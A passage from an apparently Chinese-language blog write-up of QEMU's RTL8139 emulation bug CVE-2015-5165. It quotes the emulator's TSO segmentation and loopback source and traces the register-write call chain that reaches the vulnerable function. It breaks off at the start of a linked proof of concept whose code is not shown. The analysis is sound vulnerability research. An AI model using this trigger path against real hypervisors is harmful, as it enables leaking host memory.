</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>int</span> <span class=n>tcp_data_len</span> <span class=o>=</span> <span class=n>ip_data_len</span> <span class=o>-</span> <span class=n>tcp_hlen</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>tcp_chunk_size</span> <span class=o>=</span> <span class=n>ETH_MTU</span> <span class=o>-</span> <span class=n>hlen</span> <span class=o>-</span> <span class=n>tcp_hlen</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode TSO IP data len %d TCP hlen %d TCP &#34;</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;data len %d TCP chunk size %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ip_data_len</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>tcp_hlen</span><span class=p>,</span> <span class=n>tcp_data_len</span><span class=p>,</span> <span class=n>tcp_chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* note the cycle below overwrites IP header data,
</span></span></span><span class=line><span class=cl><span class=cm>                       but restores it from saved_ip_header before sending packet */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>is_last_frame</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// 这里利用tcp_data_len进行tcp数据包的分片
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=p>(</span><span class=n>tcp_send_offset</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>tcp_send_offset</span> <span class=o>&lt;</span> <span class=n>tcp_data_len</span><span class=p>;</span> <span class=n>tcp_send_offset</span> <span class=o>+=</span> <span class=n>tcp_chunk_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint16_t</span> <span class=n>chunk_size</span> <span class=o>=</span> <span class=n>tcp_chunk_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* check if this is the last frame */</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>tcp_send_offset</span> <span class=o>+</span> <span class=n>tcp_chunk_size</span> <span class=o>&gt;=</span> <span class=n>tcp_data_len</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>is_last_frame</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>chunk_size</span> <span class=o>=</span> <span class=n>tcp_data_len</span> <span class=o>-</span> <span class=n>tcp_send_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode TSO TCP seqno %08x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nf>be32_to_cpu</span><span class=p>(</span><span class=n>p_tcp_hdr</span><span class=o>-&gt;</span><span class=n>th_seq</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* add 4 TCP pseudoheader fields */</span>
</span></span><span class=line><span class=cl>            <span class=cm>/* copy IP source and destination fields */</span>
</span></span><span class=line><span class=cl>            <span class=nf>memcpy</span><span class=p>(</span><span class=n>data_to_checksum</span><span class=p>,</span> <span class=n>saved_ip_header</span> <span class=o>+</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode TSO calculating TCP checksum for &#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;packet with %d bytes data</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>tcp_hlen</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                    <span class=n>chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>tcp_send_offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>memcpy</span><span class=p>((</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span><span class=n>p_tcp_hdr</span> <span class=o>+</span> <span class=n>tcp_hlen</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span><span class=n>p_tcp_hdr</span> <span class=o>+</span> <span class=n>tcp_hlen</span> <span class=o>+</span> <span class=n>tcp_send_offset</span><span class=p>,</span> <span class=n>chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* keep PUSH and FIN flags only for the last frame */</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>is_last_frame</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>TCP_HEADER_CLEAR_FLAGS</span><span class=p>(</span><span class=n>p_tcp_hdr</span><span class=p>,</span> <span class=n>TCP_FLAG_PUSH</span><span class=o>|</span><span class=n>TCP_FLAG_FIN</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* recalculate TCP checksum */</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_pseudo_header</span> <span class=o>*</span><span class=n>p_tcpip_hdr</span> <span class=o>=</span> <span class=p>(</span><span class=n>ip_pseudo_header</span> <span class=o>*</span><span class=p>)</span><span class=n>data_to_checksum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>p_tcpip_hdr</span><span class=o>-&gt;</span><span class=n>zeros</span>      <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>p_tcpip_hdr</span><span class=o>-&gt;</span><span class=n>ip_proto</span>   <span class=o>=</span> <span class=n>IP_PROTO_TCP</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>p_tcpip_hdr</span><span class=o>-&gt;</span><span class=n>ip_payload</span> <span class=o>=</span> <span class=nf>cpu_to_be16</span><span class=p>(</span><span class=n>tcp_hlen</span> <span class=o>+</span> <span class=n>chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>p_tcp_hdr</span><span class=o>-&gt;</span><span class=n>th_sum</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>tcp_checksum</span> <span class=o>=</span> <span class=nf>ip_checksum</span><span class=p>(</span><span class=n>data_to_checksum</span><span class=p>,</span> <span class=n>tcp_hlen</span> <span class=o>+</span> <span class=n>chunk_size</span> <span class=o>+</span> <span class=mi>12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode TSO TCP checksum %04x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=n>tcp_checksum</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>p_tcp_hdr</span><span class=o>-&gt;</span><span class=n>th_sum</span> <span class=o>=</span> <span class=n>tcp_checksum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* restore IP header */</span>
</span></span><span class=line><span class=cl>            <span class=nf>memcpy</span><span class=p>(</span><span class=n>eth_payload_data</span><span class=p>,</span> <span class=n>saved_ip_header</span><span class=p>,</span> <span class=n>hlen</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* set IP data length and recalculate IP checksum */</span>
</span></span><span class=line><span class=cl>            <span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_len</span> <span class=o>=</span> <span class=nf>cpu_to_be16</span><span class=p>(</span><span class=n>hlen</span> <span class=o>+</span> <span class=n>tcp_hlen</span> <span class=o>+</span> <span class=n>chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* increment IP id for subsequent frames */</span>
</span></span><span class=line><span class=cl>            <span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_id</span> <span class=o>=</span> <span class=nf>cpu_to_be16</span><span class=p>(</span><span class=n>tcp_send_offset</span><span class=o>/</span><span class=n>tcp_chunk_size</span> <span class=o>+</span> <span class=nf>be16_to_cpu</span><span class=p>(</span><span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_id</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_sum</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_sum</span> <span class=o>=</span> <span class=nf>ip_checksum</span><span class=p>(</span><span class=n>eth_payload_data</span><span class=p>,</span> <span class=n>hlen</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode TSO IP header len=%d &#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;checksum=%04x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>hlen</span><span class=p>,</span> <span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_sum</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>tso_send_size</span> <span class=o>=</span> <span class=n>ETH_HLEN</span> <span class=o>+</span> <span class=n>hlen</span> <span class=o>+</span> <span class=n>tcp_hlen</span> <span class=o>+</span> <span class=n>chunk_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode TSO transferring packet size &#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;%d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>tso_send_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=c1>// 将分片后的数据使用rtl8139_transfer_frame进行发送
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>rtl8139_transfer_frame</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>saved_buffer</span><span class=p>,</span> <span class=n>tso_send_size</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                   <span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>dot1q_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* add transferred count to TCP sequence number */</span>
</span></span><span class=line><span class=cl>            <span class=n>p_tcp_hdr</span><span class=o>-&gt;</span><span class=n>th_seq</span> <span class=o>=</span> <span class=nf>cpu_to_be32</span><span class=p>(</span><span class=n>chunk_size</span> <span class=o>+</span> <span class=nf>be32_to_cpu</span><span class=p>(</span><span class=n>p_tcp_hdr</span><span class=o>-&gt;</span><span class=n>th_seq</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=o>++</span><span class=n>send_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Stop sending this frame */</span>
</span></span><span class=line><span class=cl>        <span class=n>saved_size</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// .......
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>函数<code>rtl8139_transfer_frame</code>。可以看到如果有<code>TxLoopBack</code>标志的话，会调用<code>rtl8139_do_receive</code>发送给自己。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>rtl8139_transfer_frame</span><span class=p>(</span><span class=n>RTL8139State</span> <span class=o>*</span><span class=n>s</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>int</span> <span class=n>size</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>do_interrupt</span><span class=p>,</span> <span class=k>const</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>dot1q_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// .......
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>TxLoopBack</span> <span class=o>==</span> <span class=p>(</span><span class=n>s</span><span class=o>-&gt;</span><span class=n>TxConfig</span> <span class=o>&amp;</span> <span class=n>TxLoopBack</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>size_t</span> <span class=n>buf2_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>buf2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>iov</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>buf2_size</span> <span class=o>=</span> <span class=nf>iov_size</span><span class=p>(</span><span class=n>iov</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>buf2</span> <span class=o>=</span> <span class=nf>g_malloc</span><span class=p>(</span><span class=n>buf2_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>iov_to_buf</span><span class=p>(</span><span class=n>iov</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>buf2</span><span class=p>,</span> <span class=n>buf2_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span> <span class=o>=</span> <span class=n>buf2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ transmit loopback mode</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>rtl8139_do_receive</span><span class=p>(</span><span class=nf>qemu_get_queue</span><span class=p>(</span><span class=n>s</span><span class=o>-&gt;</span><span class=n>nic</span><span class=p>),</span> <span class=n>buf</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>do_interrupt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// .......
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=漏洞代码触发>漏洞代码触发<a hidden class=anchor aria-hidden=true href=#漏洞代码触发>#</a></h3><p>在该设备源码文件下方可以找到设备的<code>TypeInfo</code>和<code>rtl8139_class_init</code>结构体，后者中可以看到引用了<code>pci_rtl8139_realize</code>函数，其中初始化了PMIO和MMIO。通过查看PMIO和MMIO处理函数的调用链，可以发现最终都是调用了以下几个函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint32_t</span> <span class=nf>rtl8139_io_readb</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint32_t</span> <span class=nf>rtl8139_io_readw</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>uint32_t</span> <span class=nf>rtl8139_io_readl</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>rtl8139_io_writeb</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>rtl8139_io_writew</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>rtl8139_io_writel</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>val</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>在<code>rtl8139_io_writeb</code>中，<code>if (val & (1 &lt;&lt; 6))</code>满足，则会调用<code>rtl8139_cplus_transmit</code>，而其中会调用漏洞函数<code>rtl8139_cplus_transmit_one</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// rtl8139_cplus_transmit_one
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>rtl8139_transmitter_enabled</span><span class=p>(</span><span class=n>s</span><span class=p>))</span>  <span class=c1>// CmdTxEnb
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode: transmitter disabled</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>rtl8139_cp_transmitter_enabled</span><span class=p>(</span><span class=n>s</span><span class=p>))</span>  <span class=c1>// CPlusTxEnb
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode: C+ transmitter disabled</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span> <span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=n>CP_TX_OWN</span><span class=p>))</span>  <span class=c1>// CP_TX_OWN
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;C+ Tx mode : descriptor %d is owned by host</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>descriptor</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span> <span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=n>CP_TX_FS</span><span class=p>)</span>  <span class=c1>// CP_TX_FS
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ Tx mode : descriptor %d is first segment &#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;descriptor</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>descriptor</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* reset internal buffer offset */</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>-&gt;</span><span class=n>cplus_txbuffer_offset</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>CP_TX_IPCS</span> <span class=o>|</span> <span class=n>CP_TX_UDPCS</span> <span class=o>|</span> <span class=n>CP_TX_TCPCS</span> <span class=o>|</span> <span class=n>CP_TX_LGSEN</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>proto</span> <span class=o>==</span> <span class=n>ETH_P_IP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=n>CP_TX_IPCS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=n>CP_TX_LGSEN</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>ip_protocol</span> <span class=o>==</span> <span class=n>IP_PROTO_TCP</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>调用链：</p><p><code>rtl8139_io_writeb</code>-><code>rtl8139_cplus_transmit</code>-><code>rtl8139_cplus_transmit_one</code>-><code>rtl8139_transfer_frame</code>-><code>rtl8139_do_receive</code>。</p><h2 id=debug>Debug<a hidden class=anchor aria-hidden=true href=#debug>#</a></h2><p>因为没使用kvm，使用的Tiny Code Generator模式执行虚拟机，调试过程中总是接收到SIGUSR1信号，然后中断。在gdbscript中添加以下命令可解。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>handle SIGUSR1 nostop noprint
</span></span></code></pre></td></tr></table></div></div><h2 id=poc>PoC<a hidden class=anchor aria-hidden=true href=#poc>#</a></h2><p><a href=https://github.com/clxsh/CVE/blob/main/CVE-2015-5165/poc.c>poc.c</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
